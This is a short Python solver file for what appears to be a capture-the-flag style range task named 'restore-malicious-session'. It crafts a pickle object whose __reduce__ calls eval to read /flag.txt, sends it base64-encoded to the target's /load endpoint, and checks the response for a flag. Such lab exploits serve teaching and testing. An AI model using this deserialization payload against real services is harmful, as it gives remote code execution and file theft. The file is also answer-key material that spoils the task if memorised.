"""Intended-path solver: unsafe pickle deserialization."""

import base64
import pickle

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


class Exploit:
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    blob = base64.b64encode(pickle.dumps(Exploit()))
    res = httpx.post(f"{ctx.url()}/load", content=blob, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="restore-malicious-session",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag in response (status {res.status_code})",
            )
        ]
    )
